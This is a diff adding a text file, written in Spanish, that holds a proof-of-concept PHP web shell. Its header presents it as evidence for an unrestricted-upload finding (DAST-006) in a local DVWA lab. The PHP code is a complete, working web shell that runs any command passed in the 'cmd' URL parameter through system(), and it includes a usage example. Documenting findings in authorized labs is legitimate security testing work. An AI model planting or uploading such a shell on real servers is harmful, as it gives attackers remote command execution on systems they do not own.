@@ -1,0 +1,29 @@
+===============================================================================
+  ARCHIVO EDUCATIVO - NO DESPLEGAR EN NINGÚN SERVIDOR
+===============================================================================
+  Esta es una "web shell" de PROYECTO (prueba de concepto) usada ÚNICAMENTE
+  como evidencia del hallazgo DAST-006 (carga de archivos sin restricción)
+  en un laboratorio LOCAL y AUTORIZADO (DVWA en Docker, en la máquina del
+  autor).
+
+  Se guarda con extensión .txt para que NO sea ejecutable ni se confunda con
+  un archivo activo. Su único fin es documentar, con fines educativos, cómo
+  un archivo PHP subido podría ejecutar comandos en un servidor vulnerable.
+
+  Úsese solo en entornos propios y autorizados. El autor no se hace
+  responsable de cualquier uso indebido.
+===============================================================================
+
+<?php
+// PoC EDUCATIVA — Carga de archivos sin restricción (DVWA / lab local)
+// Demuestra que un archivo PHP subido puede ejecutar comandos (RCE).
+// Uso:  shell.php?cmd=whoami
+echo "<h3>Web shell PoC — archivo PHP ejecutandose en el servidor</h3>";
+if (isset($_GET['cmd'])) {
+    echo "<b>Comando:</b> " . htmlspecialchars($_GET['cmd']) . "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+} else {
+    echo "Web shell activa. Agrega <code>?cmd=whoami</code> a la URL para ejecutar un comando.";
+}
+?>
